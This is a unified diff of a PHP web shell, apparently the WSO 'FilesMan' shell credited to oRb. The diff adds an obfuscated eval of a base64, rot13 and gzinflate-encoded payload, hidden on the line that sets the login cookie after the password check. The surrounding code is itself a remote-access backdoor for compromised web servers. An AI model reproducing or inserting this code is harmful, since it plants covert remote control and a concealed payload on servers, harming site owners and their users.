@@ -10,7 +10,7 @@ $▜ = 'UTF-8';
 $▚ = 'FilesMan';
 $▙ = md5($_SERVER['HTTP_USER_AGENT']);
 if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])) {
-	prototype(md5($_SERVER['HTTP_HOST'])."key", $▙);
+	prototype(md5($_SERVER['HTTP_HOST'])."key", $▙); 
 }
 if(empty($_POST['charset']))
 	$_POST['charset'] = $▜;
@@ -35,12 +35,12 @@ if(!function_exists('get_magic_quotes_gpc') || get_magic_quotes_gpc()) {
 		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
 	}
 	$_POST = stripslashes_array($_POST);
-    $_COOKIE = stripslashes_array($_COOKIE);
+    $_COOKIE = stripslashes_array($_COOKIE); 
 }
 /* (С) 11.2011 oRb */
 if(!empty($▛)) {
     if(isset($_POST['pass']) && (md5($_POST['pass']) == $▛))
-        prototype(md5($_SERVER['HTTP_HOST']), $▛);
+        prototype(md5($_SERVER['HTTP_HOST']), $▛); eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBaeIQwEEDv/oogTxT8OvTksoXuSd1eV/HQUBcJJlrGuourcBXir6+awhaaWDLzmDeTZGsNogayJw7LivSlVc/U3Ozp9aOgJQmJndjhf3w8pPmG7yQtnkJSlrNG+kHLnTVZGtk3AutrBUuBZekIIEcSUpp/bqAAaCvDOI4bvI1cTitR2PE5TcGDDMUoqEKGSSv0iQKJ7XlHl1K5UYDu2SLL2bSU7B+JiVoO2x4lJXjafjMTBGMVmJClj566FiZeUpegdppg4GUOd6mx6muPve3fPTPCyHvjocdQltM/8Pd0W+9oCGmrJ92zzxrl1T1Gs9yNOuZdbaa69K3S82k/')))));
     if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $▛))
         hardLogin();
 }
